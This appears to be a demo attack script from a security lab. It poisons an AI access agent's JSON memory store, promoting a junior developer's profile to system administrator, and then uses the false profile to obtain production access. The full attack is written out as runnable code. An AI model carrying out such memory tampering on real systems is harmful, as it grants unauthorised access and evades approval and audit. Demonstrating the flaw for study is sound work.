"""
Attacker - VULNERABLE VERSION (ACRF-04 demo)

Poisons the memory store directly.
Changes John Smith from Junior Developer to System Administrator.
Then requests production access through the agent.
"""
import json
import time

import requests

AGENT_URL = "http://access-agent:8000"
MEMORY_STORE = "/app/memory_store.json"

def show_legitimate_access():
    print("=" * 70)
    print(" STEP 1: Legitimate access request (before attack)")
    print("=" * 70)
    print()
    r = requests.post(f"{AGENT_URL}/request-access",
        json={"user_id": "john.smith", "system": "production"},
        timeout=10)
    data = r.json()
    print(f"[AccessAgent] John requests production access: {data['status'].upper()}")
    if r.status_code == 403:
        print(f"[AccessAgent] Reason: {data.get('reason')}")
    print()

def poison_memory():
    print("=" * 70)
    print(" STEP 2: Attacker poisons the memory store")
    print("=" * 70)
    print()
    print("[Attacker] Reading memory store...")
    with open(MEMORY_STORE) as f:
        data = json.load(f)

    for user in data["users"]:
        if user["user_id"] == "john.smith":
            print(f"[Attacker] Found John Smith: role={user['role']}, access={user['access_level']}")
            user["role"] = "System Administrator"
            user["access_level"] = "full-access"
            user["allowed_systems"] = ["dev-environment", "staging", "production"]
            print(f"[Attacker] Poisoned entry: role={user['role']}, access={user['access_level']}")
            break

    with open(MEMORY_STORE, "w") as f:
        json.dump(data, f, indent=2)
    print("[Attacker] Memory store poisoned. Agent will now trust false profile.")
    print()

def exploit_poisoned_memory():
    print("=" * 70)
    print(" STEP 3: Attacker requests access using poisoned memory")
    print("=" * 70)
    print()
    r = requests.post(f"{AGENT_URL}/request-access",
        json={"user_id": "john.smith", "system": "production"},
        timeout=10)
    data = r.json()
    print(f"[AccessAgent] John requests production access: {data['status'].upper()}")
    if r.status_code == 200:
        print(f"[AccessAgent] Role granted: {data['role']}")
        print(f"[AccessAgent] Access level: {data['access_level']}")
    print()
    print("ATTACK SUCCEEDED")
    print("John Smith escalated from Junior Developer to System Administrator.")
    print("Production access granted. No approval. No audit trail of the change.")

if __name__ == "__main__":
    time.sleep(5)
    show_legitimate_access()
    time.sleep(1)
    poison_memory()
    time.sleep(1)
    exploit_poisoned_memory()
